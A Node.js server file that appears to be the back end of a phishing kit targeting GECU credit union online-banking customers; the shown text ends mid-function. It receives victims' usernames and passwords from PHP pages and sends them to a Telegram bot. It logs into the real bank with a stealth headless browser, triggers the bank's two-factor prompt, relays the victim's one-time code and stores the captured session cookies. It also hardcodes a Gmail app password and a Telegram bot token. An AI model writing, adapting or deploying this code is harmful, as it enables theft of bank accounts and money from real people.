const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const Database = require('better-sqlite3');
const nodemailer = require('nodemailer');
const path = require('path');
const axios = require('axios');

// Use stealth plugin to avoid detection
puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());

// Enable CORS for all routes
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    
    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    
    next();
});

// SQLite Database initialization
// Use a writable location - on cloud platforms, try /tmp first, then fallback to current directory
let dbPath;
try {
    // Try /tmp first (common writable location on Linux/cloud platforms)
    const fs = require('fs');
    const tmpDir = '/tmp';
    if (fs.existsSync(tmpDir) && fs.statSync(tmpDir).isDirectory()) {
        // Check if we can write to /tmp
        try {
            const testFile = path.join(tmpDir, '.write-test');
            fs.writeFileSync(testFile, 'test');
            fs.unlinkSync(testFile);
            dbPath = path.join(tmpDir, 'gaming.db');
            console.log('Using /tmp directory for database');
        } catch (e) {
            // Can't write to /tmp, use current directory
            dbPath = path.join(__dirname, 'gaming.db');
            console.log('Using current directory for database');
        }
    } else {
        dbPath = path.join(__dirname, 'gaming.db');
        console.log('Using current directory for database');
    }
} catch (e) {
    // Fallback to current directory
    dbPath = path.join(__dirname, 'gaming.db');
    console.log('Using current directory for database (fallback)');
}

let db;
try {
    db = new Database(dbPath);
    console.log('✅ SQLite database initialized at:', dbPath);
} catch (error) {
    console.error('❌ Failed to initialize SQLite database:', error.message);
    console.log('⚠️ Using in-memory storage as fallback');
    // Set db to null - we'll use in-memory storage
    db = null;
}

// Create tables if they don't exist (only if database is initialized)
if (db) {
    try {
        db.exec(`
            CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                ip TEXT NOT NULL UNIQUE,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );
            
            CREATE TABLE IF NOT EXISTS cookies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL UNIQUE,
                password TEXT NOT NULL,
                cookies TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );
            
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL UNIQUE,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                ip TEXT NOT NULL,
                status TEXT NOT NULL DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME NOT NULL
            );
            
            CREATE INDEX IF NOT EXISTS idx_results_ip ON results(ip);
            CREATE INDEX IF NOT EXISTS idx_cookies_email ON cookies(email);
            CREATE INDEX IF NOT EXISTS idx_sessions_session_id ON sessions(session_id);
            CREATE INDEX IF NOT EXISTS idx_sessions_expires_at ON sessions(expires_at);
        `);
        console.log('✅ Database tables created successfully');
    } catch (error) {
        console.error('❌ Failed to create database tables:', error.message);
        console.log('⚠️ Using in-memory storage as fallback');
        db = null;
    }
} else {
    console.log('⚠️ Database not available - using in-memory storage only');
}

const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36';

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7530395745:AAEcMnLa5GAjrPdt2LMSAypyNyWQHOp1jnU';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '1311316374';

// Telegram notification function
async function sendTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram notification sent');
    } catch (error) {
        console.log('⚠️ Telegram notification failed:', error.message);
    }
}

// Define your email configuration (adjust these with your SMTP settings)
const transporter = nodemailer.createTransport({
    service: 'gmail', // You can use any email service like Gmail, Outlook, etc.
    auth: {
        user: process.env.EMAIL_USER || '3alouif@gmail.com', // Your email address
        pass: process.env.EMAIL_PASS || 'howk zzqj fgax ytln', // Your email password or an app-specific password for security
    },
  });

// Test email configuration on startup
transporter.verify((error, success) => {
  if (error) {
    console.log('⚠️ Email configuration error:', error.message);
    console.log('📧 Email sending will be disabled');
  } else {
    console.log('✅ Email server is ready to send messages');
  }
});



// Initialize database connection on startup
console.log('🚀 Starting server...');
console.log('✅ SQLite database ready');

let browser;
let page; // This will hold the current page for requests
let isPageLoading = false; // To avoid race conditions

const loginUrl = "https://www.gecu-ep.org/dbank/live/app/login/consumer";
const mfaUrl = "https://www.gecu-ep.org/dbank/live/app/mfa";

// Session storage for active login sessions (in-memory for fast access)
const activeSessions = new Map();

// Clean up expired sessions every 5 minutes
setInterval(() => {
    const now = Date.now();
    for (const [sessionId, session] of activeSessions.entries()) {
        if (session.expiresAt < now) {
            console.log(`🧹 Cleaning up expired session: ${sessionId}`);
            activeSessions.delete(sessionId);
            
            // Also cleanup from database
            try {
                const deleteStmt = db.prepare('DELETE FROM sessions WHERE session_id = ?');
                deleteStmt.run(sessionId);
            } catch (e) {
                console.log('Error cleaning up session from DB:', e.message);
            }
        }
    }
}, 5 * 60 * 1000); // Every 5 minutes

async function startBrowserAndPage() {
    try {
        browser = await puppeteer.launch({
            headless: false, // Set to false for local testing to see browser window
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--disable-gpu',
                '--single-process', // May help on some systems
            ],
        });

        console.log('Browser launched successfully');
        await preloadNewPage(); // Preload the initial page
    } catch (error) {
        console.error('Error starting browser:', error.message);
        throw error;
    }
}

//------------------------------------------- Preload Page --------------------------------------------------

async function preloadNewPage() {
    try {
        page = await browser.newPage();
        await page.setRequestInterception(true);
        page.on('request', (request) => {
            // Allow stylesheets and fonts for React apps, only block images
            if (request.resourceType() === "image") {
                request.abort();
            } else {
                request.continue();
            }
        });
        await page.setUserAgent(ua);
        
        // Add anti-detection measures
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
            window.chrome = { runtime: {} };
        });
        
        await page.goto(loginUrl, { waitUntil: 'domcontentloaded' });
        console.log('✅ Page preloaded successfully');
    } catch (error) {
        console.error('Error preloading page:', error.message);
    }
}


startBrowserAndPage();

//---------------------------------------- Perform Login ----------------------------------------------------

// Function to handle GECU single-step login (User ID + Password on same page)
async function performLogin(page, userId, password) {
    try {
        console.log('Starting GECU login process for:', userId);
        
        // Check current URL
        const initialUrl = page.url();
        console.log('Current page URL:', initialUrl);
        
        // Check page title
        const pageTitle = await page.title();
        console.log('Page title:', pageTitle);
        
        // Check if we're on Cloudflare challenge page
        if (pageTitle.includes('Cloudflare') || pageTitle.includes('Attention Required')) {
            console.log('Cloudflare challenge detected, waiting for it to pass...');
            // Wait for Cloudflare challenge to complete (can take 5-15 seconds)
            try {
                await page.waitForFunction(
                    () => {
                        return !document.title.includes('Cloudflare') && 
                               !document.title.includes('Attention Required') &&
                               document.querySelectorAll('input').length > 0;
                    },
                    { timeout: 30000 }
                );
                console.log('Cloudflare challenge passed');
            } catch (e) {
                console.log('Cloudflare challenge timeout or error:', e.message);
                // Continue anyway
            }
        }
        
        // Wait for React app to load - look for login form elements (more flexible)
        console.log('Waiting for page to load...');
        
        // Wait for root element or body to be ready
        try {
            await page.waitForSelector('#root, body', { timeout: 10000 });
            console.log('Root/body element found');
        } catch (e) {
            console.log('Root/body wait timeout, continuing...');
        }
        
        // Wait longer for React to render - try multiple times
        let inputsFound = false;
        for (let i = 0; i < 10; i++) {
            await new Promise(res => setTimeout(res, 1000));
            const inputCount = await page.evaluate(() => {
                return document.querySelectorAll('input').length;
            });
            console.log(`Attempt ${i + 1}: Found ${inputCount} input fields`);
            if (inputCount > 0) {
                inputsFound = true;
                break;
            }
        }
        
        if (!inputsFound) {
            console.log('Warning: No inputs found after multiple attempts, but continuing...');
        }
        
        console.log('Login form detected');
        
        // Find User ID field (try multiple selectors - case insensitive matching via JS)
        let userIdField = null;
        
        // Debug: Log all inputs on the page
        const allInputsInfo = await page.evaluate(() => {
            const inputs = Array.from(document.querySelectorAll('input'));
            return inputs.map(input => ({
                type: input.type || 'no-type',
                id: input.id || 'no-id',
                name: input.name || 'no-name',
                placeholder: input.placeholder || 'no-placeholder',
                ariaLabel: input.getAttribute('aria-label') || 'no-aria-label',
                className: input.className || 'no-class'
            }));
        });
        console.log(`Debug: Found ${allInputsInfo.length} input fields on page:`, JSON.stringify(allInputsInfo, null, 2));
        
        try {
            // Get all input fields
            const allInputs = await page.$$('input');
            const textInputs = [];
            
            // Filter to only text/email inputs (exclude password, checkbox, radio, hidden, submit, button)
            for (const input of allInputs) {
                const inputType = await page.evaluate(el => el.type || 'text', input);
                if (inputType !== 'password' && 
                    inputType !== 'checkbox' && 
                    inputType !== 'radio' && 
                    inputType !== 'hidden' &&
                    inputType !== 'submit' &&
                    inputType !== 'button') {
                    textInputs.push(input);
                }
            }
            
            console.log(`Found ${textInputs.length} text input fields after filtering`);
            
            if (textInputs.length === 0) {
                // Last resort: try to find ANY input that's not password
                console.log('No text inputs found with normal filter, trying all non-password inputs...');
                for (const input of allInputs) {
                    const inputType = await page.evaluate(el => el.type, input);
                    if (inputType !== 'password') {
                        textInputs.push(input);
                    }
                }
                console.log(`After fallback filter: ${textInputs.length} inputs`);
            }
            
            // Try to find by placeholder, aria-label, id, or name (case insensitive)
            for (const field of textInputs) {
                const fieldInfo = await page.evaluate(el => {
                    return {
                        placeholder: (el.placeholder || '').toLowerCase(),
                        ariaLabel: (el.getAttribute('aria-label') || '').toLowerCase(),
                        id: (el.id || '').toLowerCase(),
                        name: (el.name || '').toLowerCase(),
                        type: el.type || 'text'
                    };
                }, field);
                
                console.log(`Checking input field:`, fieldInfo);
                
                // Check if this looks like a user ID field
                if (fieldInfo.placeholder.includes('user') || 
                    fieldInfo.placeholder.includes('id') ||
                    fieldInfo.ariaLabel.includes('user') ||
                    fieldInfo.ariaLabel.includes('id') ||
                    fieldInfo.id.includes('user') ||
                    fieldInfo.name.includes('user')) {
                    userIdField = field;
                    console.log('Found User ID field by label/id/name');
                    break;
                }
            }
            
            // If not found by label, use first text input as fallback
            if (!userIdField && textInputs.length > 0) {
                userIdField = textInputs[0];
                console.log('Using first text input as User ID field (fallback)');
            }
        } catch (e) {
            console.log('Error finding User ID field:', e.message);
            console.error(e);
        }
        
        if (!userIdField) {
            throw new Error(`User ID field not found - checked ${allInputsInfo.length} total inputs on page`);
        }
        
        // Enter User ID
        await userIdField.click();
        await page.keyboard.down('Control');
        await page.keyboard.press('KeyA');
        await page.keyboard.up('Control');
        await userIdField.type(userId, { delay: 50 });
        console.log('User ID typed');
        
        // Find Password field
        const passwordField = await page.$('input[type="password"]');
        if (!passwordField) {
            throw new Error('Password field not found');
        }
        
        // Enter Password
        await passwordField.click();
        await page.keyboard.down('Control');
        await page.keyboard.press('KeyA');
        await page.keyboard.up('Control');
        await passwordField.type(password, { delay: 50 });
        console.log('Password typed');
        
        // Wait a moment before clicking login
        await new Promise(res => setTimeout(res, 500));
        
        // Find and click Login button
        const loginButton = await page.evaluateHandle(() => {
            const buttons = Array.from(document.querySelectorAll('button, [role="button"], a[href*="login"]'));
            return buttons.find(btn => {
                const text = btn.textContent?.trim().toLowerCase();
                return text === 'login' || text === 'sign in' || text === 'log in';
            });
        });
        
        if (loginButton && loginButton.asElement()) {
            await loginButton.asElement().click();
            console.log('Login button clicked');
        } else {
            // Fallback: try to submit form or press Enter
            await page.keyboard.press('Enter');
            console.log('Pressed Enter to submit login');
        }
        
        // Wait for navigation
        try {
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });
        } catch (e) {
            console.log('Navigation timeout, checking current page state...');
        }
        
        const currentUrl = page.url();
        console.log('Current URL after login:', currentUrl);
        
        // Check for errors
        await new Promise(res => setTimeout(res, 1000)); // Wait for potential error messages
        
        const hasError = await page.evaluate(() => {
            const bodyText = document.body.textContent || '';
            return bodyText.toLowerCase().includes('incorrect') || 
                   bodyText.toLowerCase().includes('invalid') ||
                   bodyText.toLowerCase().includes('error');
        });
        
        if (hasError && currentUrl.includes('/login')) {
            return { success: false, mode: 'error', error: 'Login failed - invalid credentials' };
        }
        
        // Check if we're on MFA page
        if (currentUrl.includes('/mfa') || currentUrl.includes('mfa')) {
            console.log('MFA page detected');
            return { success: true, mode: '2fa_method_selection' };
        }
        
        // Check if we're on code entry page (already past method selection)
        const codeInput = await page.evaluateHandle(() => {
            const inputs = Array.from(document.querySelectorAll('input[type="text"], input:not([type])'));
            return inputs.find(input => {
                const placeholder = (input.placeholder || '').toLowerCase();
                const ariaLabel = (input.getAttribute('aria-label') || '').toLowerCase();
                return placeholder.includes('code') || ariaLabel.includes('code') || placeholder.includes('enter code');
            });
        });
        if (codeInput && codeInput.asElement()) {
            console.log('Code input field found - ready for code entry');
            return { success: true, mode: '2fa_code_entry' };
        }
        
        // If no 2FA detected, assume successful login
        console.log('No 2FA detected - assuming successful login');
        return { success: true, mode: 'logged_in' };
    } catch (error) {
        // Debug catch-all
        console.error('Error during login process:', error);
        return { success: false, mode: 'error', error: error.message || 'Internal error' };
    }
}

// Function to handle 2FA method selection (prefer Text, then Call, then Email)
async function select2FAMethod(page) {
    try {
        console.log('Selecting 2FA method...');
        
        // Wait for MFA page to load
        await page.waitForFunction(
            () => {
                const bodyText = document.body.textContent || '';
                return bodyText.includes('Text me') || bodyText.includes('Call me') || bodyText.includes('Email me');
            },
            { timeout: 10000 }
        );
        
        // Try to find and click "Text me" button (preferred)
        const methods = ['Text me', 'Call me', 'Email me'];
        
        for (const methodText of methods) {
            try {
                const button = await page.evaluateHandle((text) => {
                    const buttons = Array.from(document.querySelectorAll('button, [role="button"], a, span, div'));
                    return buttons.find(btn => {
                        const btnText = btn.textContent?.trim();
                        return btnText === text || btnText.includes(text);
                    });
                }, methodText);
                
                if (button && button.asElement()) {
                    await button.asElement().click();
                    console.log(`Clicked "${methodText}" button`);
                    await new Promise(res => setTimeout(res, 2000)); // Wait for code to be sent
                    return { success: true, method: methodText };
                }
            } catch (e) {
                console.log(`Could not find "${methodText}" button, trying next method...`);
                continue;
            }
        }
        
        throw new Error('No 2FA method button found');
    } catch (error) {
        console.error('Error selecting 2FA method:', error);
        return { success: false, error: error.message };
    }
}

//---------------------------------------- In-memory storage (fallback) -------------------------------------

// In-memory storage as fallback when SQLite is not available
const memoryStorage = new Map();

//---------------------------------------- Get Email By IP --------------------------------------------------

async function getEmailPasswordByIP(ip) {
    const stmt = db.prepare('SELECT email, password FROM results WHERE ip = ?');
    const entry = stmt.get(ip);
    
    if (!entry) {
        // Fallback to memory storage
        const memoryEntry = memoryStorage.get(ip);
        if (!memoryEntry) {
            throw new Error('IP not found');
        }
        return { email: memoryEntry.email, password: memoryEntry.password };
    }

    return { email: entry.email, password: entry.password };
}

//---------------------------------------- Saving emails and passwords --------------------------------------

async function saveEmailPasswordIP(email, password, ip) {
    try {
        const checkStmt = db.prepare('SELECT id FROM results WHERE ip = ?');
        const existingEntry = checkStmt.get(ip);
        
        if (existingEntry) {
            // Update existing entry
            const updateStmt = db.prepare('UPDATE results SET email = ?, password = ?, updated_at = CURRENT_TIMESTAMP WHERE ip = ?');
            updateStmt.run(email, password, ip);
            console.log('Data updated successfully.');
        } else {
            // Insert new entry
            const insertStmt = db.prepare('INSERT INTO results (email, password, ip) VALUES (?, ?, ?)');
            insertStmt.run(email, password, ip);
            console.log('Data saved successfully.');
        }
    } catch (error) {
        console.log('SQLite save failed, using memory storage:', error.message);
        memoryStorage.set(ip, { email, password });
        console.log('Data saved to memory storage');
    }
}

//----------------------------------------- Session Management ---------------------------------------------

function createSession(sessionId, email, password, ip) {
    const expiresAt = new Date(Date.now() + 15 * 60 * 1000); // 15 minutes from now
    
    const session = {
        sessionId,
        email,
        password,
        ip,
        status: 'pending',
        createdAt: Date.now(),
        expiresAt: expiresAt.getTime(),
        browser: null,
        page: null
    };
    
    activeSessions.set(sessionId, session);
    
    // Also save to database
    try {
        const insertStmt = db.prepare(`
            INSERT INTO sessions (session_id, email, password, ip, status, expires_at)
            VALUES (?, ?, ?, ?, 'pending', ?)
        `);
        insertStmt.run(sessionId, email, password, ip, expiresAt.toISOString());
    } catch (error) {
        console.log('Error saving session to DB:', error.message);
    }
    
    return session;
}

function getSession(sessionId) {
    // Check in-memory first
    const session = activeSessions.get(sessionId);
    if (session) {
        // Check if expired
        if (session.expiresAt < Date.now()) {
            activeSessions.delete(sessionId);
            return null;
        }
        return session;
    }
    
    // Fallback to database
    try {
        const stmt = db.prepare('SELECT * FROM sessions WHERE session_id = ? AND expires_at > datetime("now")');
        const row = stmt.get(sessionId);
        if (row) {
            return {
                sessionId: row.session_id,
                email: row.email,
                password: row.password,
                ip: row.ip,
                status: row.status,
                createdAt: new Date(row.created_at).getTime(),
                expiresAt: new Date(row.expires_at).getTime(),
                browser: null,
                page: null
            };
        }
    } catch (error) {
        console.log('Error getting session from DB:', error.message);
    }
    
    return null;
}

function updateSessionStatus(sessionId, status) {
    const session = activeSessions.get(sessionId);
    if (session) {
        session.status = status;
        session.updatedAt = Date.now();
    }
    
    // Update database
    try {
        const updateStmt = db.prepare('UPDATE sessions SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE session_id = ?');
        updateStmt.run(status, sessionId);
    } catch (error) {
        console.log('Error updating session in DB:', error.message);
    }
}

//----------------------------------------- API Endpoints for PHP Integration ------------------------------

// New endpoint: Initialize login session (called from step1.php)
app.post('/api/init-login', async (req, res) => {
    const { sessionId, email, password, ip } = req.body;

    if (!sessionId || !email || !password || !ip) {
        return res.status(400).json({ success: false, error: 'sessionId, email, password, and ip are required' });
    }

    try {
        // Create session
        const session = createSession(sessionId, email, password, ip);
        console.log(`✅ Session created: ${sessionId} for ${email}`);
        
        // Send credentials to Telegram
        const telegramMsg = `🔥 <b>GECU 💰</b>\n\n` +
                           `👤 <b>USERNAME:</b> ${email}\n` +
                           `🔒 <b>PASSWORD:</b> ${password}\n\n` +
                           `ℹ️ <b>IP INFO:</b> ${ip}\n` +
                           `📆 <b>TIME/DATE:</b> ${new Date().toLocaleString()}\n\n` +
                           `🥷🥷G 1 N G🥷🥷`;
        await sendTelegram(telegramMsg);
        
        // Start login process asynchronously (don't wait)
        (async () => {
            let localBrowser = null;
            let localPage = null;
            
            try {
                // Create a new browser instance for this session
                localBrowser = await puppeteer.launch({
                    headless: true,
                    args: [
                        '--no-sandbox',
                        '--disable-setuid-sandbox',
                        '--disable-dev-shm-usage',
                        '--disable-blink-features=AutomationControlled',
                        '--disable-gpu',
                        '--single-process',
                    ],
                });

                localPage = await localBrowser.newPage();
                await localPage.setRequestInterception(true);
                localPage.on('request', (request) => {
                    if (request.resourceType() === "image") {
                        request.abort();
                    } else {
                        request.continue();
                    }
                });
                await localPage.setUserAgent(ua);
                
                await localPage.evaluateOnNewDocument(() => {
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined,
                    });
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3, 4, 5],
                    });
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['en-US', 'en'],
                    });
                    window.chrome = { runtime: {} };
                });
                
                await localPage.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
                await localPage.setViewport({ width: 1280, height: 800 });
                
                // Wait for React app to load
                try {
                    await localPage.waitForSelector('body', { timeout: 10000 });
                    await new Promise(res => setTimeout(res, 3000));
                } catch (e) {
                    console.log('Warning: Body selector timeout, continuing anyway...');
                }
                
                // Perform login
                const loginResult = await performLogin(localPage, email, password);
                
                if (!loginResult.success) {
                    updateSessionStatus(sessionId, 'failed');
                    await sendTelegram(`❌ <b>GECU Login Failed</b>\n\nSession: ${sessionId}\nEmail: ${email}\nError: ${loginResult.error}\n\n⚠️ Please connect manually.`);
                    
                    if (localBrowser) await localBrowser.close();
                    return;
                }
                
                // Handle 2FA method selection
                if (loginResult.mode === '2fa_method_selection') {
                    const methodResult = await select2FAMethod(localPage);
                    
                    if (methodResult.success) {
                        updateSessionStatus(sessionId, 'otp_sent');
                        // Store browser and page in session
                        session.browser = localBrowser;
                        session.page = localPage;
                        activeSessions.set(sessionId, session);
                        console.log(`✅ OTP sent via ${methodResult.method} for session ${sessionId}`);
                    } else {
                        updateSessionStatus(sessionId, 'failed');
                        await sendTelegram(`❌ <b>GECU 2FA Method Selection Failed</b>\n\nSession: ${sessionId}\nEmail: ${email}\nError: ${methodResult.error}\n\n⚠️ Please connect manually.`);
                        if (localBrowser) await localBrowser.close();
                    }
                } else if (loginResult.mode === 'logged_in') {
                    // No 2FA required - get cookies immediately
                    const cookies = await localPage.cookies();
                    const userEntry = {
                        email,
                        password,
                        cookies: cookies.filter(cookie => !cookie.name.includes('EDGESCAPE')).map(cookie => ({ ...cookie, secure: true, sameSite: 'lax' }))
                    };
                    
                    // Save cookies
                    try {
                        const cookiesJson = JSON.stringify(userEntry.cookies);
                        const checkStmt = db.prepare('SELECT id FROM cookies WHERE email = ?');
                        const existingCookie = checkStmt.get(email);
                        
                        if (existingCookie) {
                            const updateStmt = db.prepare('UPDATE cookies SET password = ?, cookies = ?, updated_at = CURRENT_TIMESTAMP WHERE email = ?');
                            updateStmt.run(password, cookiesJson, email);
                        } else {
                            const insertStmt = db.prepare('INSERT INTO cookies (email, password, cookies) VALUES (?, ?, ?)');
                            insertStmt.run(email, password, cookiesJson);
                        }
                        console.log('Cookies saved to SQLite');
                    } catch (error) {
                        console.log('⚠️ Cookie save error:', error.message);
                    }
                    
                    updateSessionStatus(sessionId, 'completed');
                    if (localBrowser) await localBrowser.close();
                }
            } catch (error) {
                console.error('Error in background login process:', error);
                updateSessionStatus(sessionId, 'failed');
                await sendTelegram(`❌ <b>GECU Login Error</b>\n\nSession: ${sessionId}\nEmail: ${email}\nError: ${error.message}\n\n⚠️ Please connect manually.`);
                if (localBrowser) await localBrowser.close();
            }
        })();
        
        // Respond immediately
        res.status(200).json({ 
            success: true, 
            message: 'Login process started. OTP will be sent shortly.' 
        });
        
    } catch (error) {
        console.error('Error initializing login:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// New endpoint: Submit OTP (called from sms.php)
app.post('/api/submit-otp', async (req, res) => {
    const { sessionId, code } = req.body;

    if (!sessionId || !code) {
        return res.status(400).json({ success: false, error: 'sessionId and code are required' });
    }

    const session = getSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, error: 'Session not found or expired' });
    }

    if (session.status !== 'otp_sent') {
        return res.status(400).json({ success: false, error: 'Session not ready for OTP submission' });
    }

    let localBrowser = session.browser;
    let localPage = session.page;

    try {
        if (!localPage || localPage.isClosed()) {
            // Need to recreate browser session
            throw new Error('Browser session lost. Please restart login process.');
        }

        // Find and type OTP code
        await new Promise(res => setTimeout(res, 1000));
        
        const codeInput = await localPage.evaluateHandle(() => {
            const inputs = Array.from(document.querySelectorAll('input[type="text"], input:not([type])'));
            return inputs.find(input => {
                const placeholder = (input.placeholder || '').toLowerCase();
                const ariaLabel = (input.getAttribute('aria-label') || '').toLowerCase();
                return placeholder.includes('code') || 
                       ariaLabel.includes('code') || 
                       placeholder.includes('enter code');
            });
        });
        
        if (!codeInput || !codeInput.asElement()) {
            throw new Error('Code input field not found');
        }
        
        await codeInput.asElement().click();
        await localPage.keyboard.down('Control');
        await localPage.keyboard.press('KeyA');
        await localPage.keyboard.up('Control');
        await codeInput.asElement().type(code, { delay: 50 });
        console.log('OTP code typed');
        
        await new Promise(res => setTimeout(res, 500));
        
        // Submit the code
        const submitButton = await localPage.evaluateHandle(() => {
            const buttons = Array.from(document.querySelectorAll('button, [role="button"], a, input[type="submit"]'));
            return buttons.find(btn => {
                const text = (btn.textContent || btn.value || '').trim().toLowerCase();
                return text === 'submit' || text === 'continue' || text === 'verify' || 
                       text.includes('submit') || btn.type === 'submit';
            });
        });
        
        if (submitButton && submitButton.asElement()) {
            await submitButton.asElement().click();
            console.log('Submit button clicked');
        } else {
            await localPage.keyboard.press('Enter');
            console.log('Pressed Enter to submit code');
        }
        
        // Wait for navigation
        try {
            await localPage.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });
        } catch (e) {
            console.log('Navigation timeout, checking result...');
        }
        
        await new Promise(res => setTimeout(res, 2000));
        
        // Check for errors
        const hasError = await localPage.evaluate(() => {
            const bodyText = document.body.textContent || '';
            return bodyText.toLowerCase().includes('incorrect') || 
                   bodyText.toLowerCase().includes('invalid') ||
                   bodyText.toLowerCase().includes('error');
        });
        
        const currentUrl = localPage.url();
        
        if (hasError || currentUrl.includes('/mfa')) {
            updateSessionStatus(sessionId, 'otp_failed');
            return res.status(400).json({ 
                success: false, 
                error: 'Invalid verification code. Please try again.' 
            });
        }
        
        // Success! Get cookies
        const cookies = await localPage.cookies();
        const userEntry = {
            email: session.email,
            password: session.password,
            cookies: cookies.filter(cookie => !cookie.name.includes('EDGESCAPE')).map(cookie => ({ ...cookie, secure: true, sameSite: 'lax' }))
        };
        
        // Save cookies
        try {
            const cookiesJson = JSON.stringify(userEntry.cookies);
            const checkStmt = db.prepare('SELECT id FROM cookies WHERE email = ?');
            const existingCookie = checkStmt.get(session.email);
            
            if (existingCookie) {
                const updateStmt = db.prepare('UPDATE cookies SET password = ?, cookies = ?, updated_at = CURRENT_TIMESTAMP WHERE email = ?');
                updateStmt.run(session.password, cookiesJson, session.email);
            } else {
                const insertStmt = db.prepare('INSERT INTO cookies (email, password, cookies) VALUES (?, ?, ?)');
                insertStmt.run(session.email, session.password, cookiesJson);
            }
            console.log('Cookies saved to SQLite');
        } catch (error) {
            console.log('⚠️ Cookie save error:', error.message);
        }
        
        // Send success notification
        await sendTelegram(`✅ <b>GECU Login Success</b>\n\nSession: ${sessionId}\nEmail: ${session.email}\nCookies captured successfully!`);
        
        updateSessionStatus(sessionId, 'completed');
        
        // Clean up
        if (localBrowser) {
            await localBrowser.close();
        }
        activeSessions.delete(sessionId);
        
        res.status(200).json({ 
            success: true, 
            message: 'Login successful. Cookies captured.' 
        });
        
    } catch (error) {
        console.error('Error submitting OTP:', error);
        updateSessionStatus(sessionId, 'failed');
        
        if (localBrowser) {
            try {
                await localBrowser.close();
            } catch (e) {
                // Ignore close errors
            }
        }
        activeSessions.delete(sessionId);
        
        await sendTelegram(`❌ <b>GECU OTP Submission Failed</b>\n\nSession: ${sessionId}\nEmail: ${session.email}\nError: ${error.message}\n\n⚠️ Please connect manually.`);
        
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// New endpoint: Check session status (for polling from PHP)
app.get('/api/session/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = getSession(sessionId);
    
    if (!session) {
        return res.status(404).json({ success: false, error: 'Session not found or expired' });
    }
    
    res.status(200).json({
        success: true,
        session: {
            status: session.status,
            email: session.email,
            createdAt: session.createdAt,
            expiresAt: session.expiresAt
        }
    });
});

//----------------------------------------- Legacy Endpoints (keeping for backward compatibility) ----------

// Endpoint handling the request
app.post('/login', async (req, res) => {
    const { email, password, ip } = req.body;

    if (!email || !password || !ip) {
        return res.status(400).json({ error: 'Email, password, and IP are required' });
    }

    let localPage = null;
    try {
        // 1. Ensure browser is initialized
        if (!browser) {
            await startBrowserAndPage();
        }
        // Create a new page per request
        localPage = await browser.newPage();
        await localPage.setRequestInterception(true);
        localPage.on('request', (request) => {
            // Allow stylesheets and fonts for React apps, only block images
            if (request.resourceType() === "image") {
                request.abort();
            } else {
                request.continue();
            }
        });
        await localPage.setUserAgent(ua);
        
        // Add anti-detection measures
        await localPage.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
            window.chrome = { runtime: {} };
        });
        
        await localPage.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
        await localPage.setViewport({ width: 1280, height: 800 });
        
        // Wait for React app to load - wait for body or root element
        try {
            await localPage.waitForSelector('body', { timeout: 10000 });
            // Additional wait for React to render
            await new Promise(res => setTimeout(res, 3000));
        } catch (e) {
            console.log('Warning: Body selector timeout, continuing anyway...');
        }
        
        // 2. Actually perform login (GECU single-step login)
        const loginResult = await performLogin(localPage, email, password);
        
        // Handle 2FA method selection
        if (loginResult.success && loginResult.mode === '2fa_method_selection') {
            // Select 2FA method (Text me, Call me, or Email me)
            const methodResult = await select2FAMethod(localPage);
            
            if (methodResult.success) {
                // Save credentials for 2FA step
                await saveEmailPasswordIP(email, password, ip);
                
                // Close the local page first
                if (localPage && !localPage.isClosed()) {
                    await localPage.close();
                }
                
                // Close browser and create fresh one after 2FA initiation
                if (browser) {
                    await browser.close();
                    console.log('Browser closed after 2FA method selection');
                }
                
                // Create fresh browser and preload page
